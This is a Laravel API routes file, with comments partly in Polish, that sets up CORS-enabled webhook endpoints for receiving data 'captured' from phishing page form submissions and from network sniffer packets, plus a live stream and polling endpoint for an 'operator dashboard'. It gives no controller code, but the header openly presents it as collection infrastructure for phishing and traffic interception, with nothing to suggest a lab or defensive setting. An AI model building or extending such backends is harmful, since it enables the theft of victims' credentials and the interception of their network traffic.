<?php

use App\Http\Controllers\WebhookController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| FORKED_DATA — Webhook endpoints for receiving captured data from
| phishing pages (form submissions) and network sniffers (packets).
| All endpoints are CORS-enabled for cross-origin access.
|
*/

// Preflight CORS (dla POST z innych domen)
Route::options('/webhook/capture', [WebhookController::class, 'options']);
Route::options('/webhook/packet',  [WebhookController::class, 'options']);
Route::options('/live-feed',       [WebhookController::class, 'options']);

// === AEGIS — Przechwytywanie danych z formularzy phishingowych ===
Route::post('/webhook/capture', [WebhookController::class, 'capture']);

// === NODE — Przechwytywanie pakietów sieciowych ze sniffera ===
Route::post('/webhook/packet', [WebhookController::class, 'packet']);

// === CONECT — Strumień live dla dashboardu operatora ===
Route::get('/live-feed', [WebhookController::class, 'stream']);

// === Polling fallback — ostatnie rekordy bez SSE ===
Route::get('/latest', [WebhookController::class, 'latest']);
